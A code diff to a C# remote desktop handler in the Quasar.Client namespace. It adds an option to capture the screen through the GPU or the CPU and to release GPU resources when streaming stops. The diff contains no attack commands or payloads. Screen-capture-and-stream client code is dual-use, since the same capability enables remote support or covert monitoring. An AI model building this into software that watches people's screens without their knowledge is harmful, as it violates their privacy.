@@ -32,6 +32,8 @@ namespace Quasar.Client.Messages
         private Thread _captureThread;
         private CancellationTokenSource _cancellationTokenSource;
 
+        private bool _useGPU = false;
+
         // frame control variables
         private readonly ConcurrentQueue<byte[]> _frameBuffer = new ConcurrentQueue<byte[]>();
         private readonly AutoResetEvent _frameRequestEvent = new AutoResetEvent(false);
@@ -115,6 +117,9 @@ namespace Quasar.Client.Messages
             _displayIndex = message.DisplayIndex;
             _clientMain = client;
 
+            _useGPU = message.UseGPU;
+            Debug.WriteLine("Use GPU: " + _useGPU);
+
             // clear any pending frame requests and existing frames
             ClearFrameBuffer();
             Interlocked.Exchange(ref _pendingFrameRequests, message.FramesRequested);
@@ -161,6 +166,12 @@ namespace Quasar.Client.Messages
             {
                 _streamCodec.Dispose();
                 _streamCodec = null;
+            }
+
+            // clean up gpu bs
+            if (_useGPU)
+            {
+                ScreenHelperGPU.CleanupResources();
             }
 
             // clear the buff
@@ -233,7 +244,10 @@ namespace Quasar.Client.Messages
         {
             try
             {
-                _desktop = ScreenHelperCPU.CaptureScreen(_displayIndex);
+                if (_useGPU)
+                    _desktop = ScreenHelperGPU.CaptureScreen(_displayIndex);
+                else
+                    _desktop = ScreenHelperCPU.CaptureScreen(_displayIndex);
 
                 if (_desktop == null)
                 {
@@ -384,6 +398,12 @@ namespace Quasar.Client.Messages
                 _streamCodec?.Dispose();
                 _cancellationTokenSource?.Dispose();
                 _frameRequestEvent?.Dispose();
+
+                // Clean up GPU resources
+                if (_useGPU)
+                {
+                    ScreenHelperGPU.CleanupResources();
+                }
             }
         }
     }
